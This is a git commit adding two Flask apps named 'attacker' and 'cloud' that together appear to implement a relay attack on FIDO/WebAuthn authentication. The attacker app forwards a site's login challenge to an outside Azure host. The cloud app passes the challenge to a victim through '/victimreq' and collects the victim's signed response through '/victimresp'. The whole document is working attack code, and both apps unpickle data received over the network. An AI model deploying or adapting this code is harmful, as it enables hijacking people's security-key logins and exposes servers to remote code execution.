e293f6f9619ba3408055f533d2746c579cf6c288
Aditya Mitra <adityaarghya0@gmail.com>
2023-09-06 08:43:22 +0530

    Add files via upload

---
+++ attacker/flaskapp.py
@@ -0,0 +1,61 @@
+from flask import *
+from flask_cors import CORS
+import os
+import base64
+import json
+import pickle
+import requests
+app = Flask(__name__)
+CORS(app)
+
+cloudurl='https://fidotest.eastus.cloudapp.azure.com'
+
+def arrToBarr(arr):
+	x=bytearray(len(arr))
+	for i in range(len(arr)):
+		x[i]=arr[i]
+	return bytes(x)
+
+def makeOptions(opt):
+	#print(opt)
+	options={}
+	options['challenge']=arrToBarr(opt['challenge'])
+	options['rpId']=opt['rpId']
+	if 'timeout' in opt:
+		options['timeout']=opt['timeout']
+	if 'userVerification' in opt:	
+		options['userVerification']=opt['userVerification']
+	if 'extensions' in opt:
+		options['extensions']=opt['extensions']
+	ac=[]
+	for zz in opt['allowCredentials']:
+		cred={}
+		cred['type']=zz['type']
+		cred['id']=arrToBarr(zz['id'])
+		if 'transports' in zz:
+			cred['transports']=zz['transports']
+		ac.append(cred)
+	options['allowCredentials']=ac
+	return options		
+
+@app.route("/", methods=["GET","POST"])
+def index():
+	return "active"
+		
+@app.route("/getoptions", methods=["GET","POST"])
+def getoptions():
+	opt= request.json
+	url=request.args.get('site')
+	options=makeOptions(opt);
+	optionsb64=base64.b64encode(pickle.dumps(options)).decode()
+	optdata={'optionsb64': optionsb64, 'url': url}
+	optdatab64=base64.b64encode(pickle.dumps(optdata)).decode()
+	resp1=requests.post(cloudurl+'/getoptions', data={'data':optdatab64})
+	res1=resp1.text
+	#writeoptionsfile(optdatab64)
+	#res1=getccddata()
+	res=pickle.loads(base64.b64decode(res1.encode()))
+	return jsonify(res)
+	
+if __name__=="__main__":
+	app.run(host="0.0.0.0", port=5000)
---
+++ cloud/flaskapp.py
@@ -0,0 +1,72 @@
+from flask import *
+from flask_cors import CORS
+import os
+import base64
+import json
+import pickle
+app = Flask(__name__)
+flpath='.'
+optionsfile=flpath+'/optionsfile.txt'
+ccdfile=flpath+'/ccdfile.txt'
+
+try:
+	os.remove(optionsfile)
+	os.remove(ccdfile)
+except:
+	pass
+
+
+app = Flask(__name__)
+CORS(app)
+
+
+@app.route("/", methods=["GET","POST"])
+def index():
+	return "active"
+
+@app.route("/victimreq", methods=["GET","POST"])
+def victimreq():
+	try:
+		fl=open(optionsfile, 'r')
+		txt=fl.read()
+		fl.close()
+		os.remove(optionsfile)
+		return txt
+	except:
+		return ""
+	
+		
+@app.route("/victimresp",methods=["GET","POST"])
+def victimresp():
+	data=request.form.get('ccddata')
+	print(data)
+	fl=open(ccdfile,'w')
+	fl.write(data)
+	fl.close()
+	return "success"
+
+def getccddata():
+	while True:
+		try:
+			fl=open(ccdfile, 'r')
+			txt=fl.read()
+			fl.close()
+			os.remove(ccdfile)
+			return txt
+		except:
+			pass
+			
+def writeoptionsfile(options):
+	fl=open(optionsfile,'w')
+	fl.write(options)
+	fl.close()
+		
+@app.route("/getoptions", methods=["GET","POST"])
+def getoptions():
+	optdatab64=request.form.get('data')
+	writeoptionsfile(optdatab64)
+	res1=getccddata()
+	return res1	
+	
+if __name__=="__main__":
+	app.run(host="0.0.0.0", port=5000)
